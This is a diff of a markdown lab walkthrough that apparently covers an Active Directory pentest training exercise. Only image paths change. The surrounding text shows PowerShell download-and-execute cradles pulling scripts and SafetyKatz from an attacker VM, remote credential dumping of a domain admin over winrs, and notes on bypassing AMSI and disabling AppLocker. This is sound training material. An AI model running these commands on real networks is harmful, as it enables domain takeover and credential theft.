@@ -80,7 +80,7 @@ DCORP-MGMT     dcorp\svcadmin   False
 
 Sweet! There is a <mark style="background-color:red;">domain admin (svcadmin) session on dcorp-mgmt server</mark>! We do not have access to the server but that comes later.
 
-<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 > We can see if this user is domain admin comparing it to BloodHound
 
@@ -109,7 +109,7 @@ Upload the file sbloggingbypass.txt --->
 iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.113/sbloggingbypass.txt'))
 ```
 
-<figure><img src="../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Bypass AMSI
 
@@ -196,7 +196,7 @@ We would now run SafetyKatz.exe =(versión modificada de Mimikatz que se usa par
 
 > Remember upload SafetyKatz to the webshell
 
-<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt="" width="302"><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt="" width="302"><figcaption></figcaption></figure>
 
 > ```
 > [ Attacker VM ] 172.16.100.113
@@ -278,7 +278,7 @@ $null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.
 
 <figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>
 
 Sweet! We got credentials of svcadmin - a domain administrator. Note that svcadmin is used as a service account (see “Session” in the above output), so you can even get credentials in clear-text from lsasecrets!
 
@@ -316,7 +316,7 @@ Now moving on to the next task, we need to escalate to domain admin using deriva
 Find-PSRemotingLocalAdminAccess
 ```
 
-<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 > We have local admin on the dcorp-adminsrv. You will notice that any attempt to run Loader.exe (to run SafetKatz from memory) results in error  ‘**This program is blocked by group policy. For more information, contact your system administrator**’. Any attempts to run Invoke-Mimi on dcorp-adminsrv results in errors about language mode. This could be because of an application allowlist on dcorp-adminsrv and we drop into a `Constrained Language Mode (CLM)` when using PSRemoting.
 
@@ -432,7 +432,7 @@ Copy-Item C:\AD\Tools\Invoke-TheKatEx-vault-std113.ps1 \\dcorp-adminsrv.dollarco
 
 Now, run the script. Again, it may take a couple of minutes for the script execution to complete:
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 Sweet! We got credentials for the `srvadmin` user in clear-text!&#x20;
 
@@ -462,7 +462,7 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can see how we have local admin access on the `dcorp-mgmt` server as srvadmin and we already know a session of svcadmin is present on that machine.
 
@@ -476,7 +476,7 @@ Copy the Loader.exe to `dcorp-mgmt`:
 echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now extract the credentials:
 
@@ -488,7 +488,7 @@ Now extract the credentials:
 winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://172.16.100.113:80/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Disable Applocker on dcorp-adminsrv by modifying GPO
 
@@ -498,7 +498,7 @@ Let’s make changes to the Group Policy and disable Applocker on dcorp-adminsrv
 
 We need the Group Policy Management Console for this. As the student VM is a Server 2022 machine, we can install it using the following steps: `Open Server Manager -> Add Roles and Features -> Next -> Features -> Check Group Policy Management -> Next -> Install`
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 After the installation is completed, start the gpmc.&#x20;
 
